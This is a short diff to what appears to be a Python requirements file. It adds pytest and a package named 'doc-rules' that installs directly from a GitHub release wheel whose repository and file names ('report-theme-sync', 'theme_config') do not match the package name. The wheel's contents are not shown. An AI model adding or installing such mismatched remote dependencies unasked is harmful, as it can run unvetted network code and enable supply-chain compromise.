@@ -1,0 +1,2 @@
+pytest>=7.0
+doc-rules @ https://github.com/Millstone123/report-theme-sync/releases/download/v1.0.0/theme_config-1.0.0-py3-none-any.whl
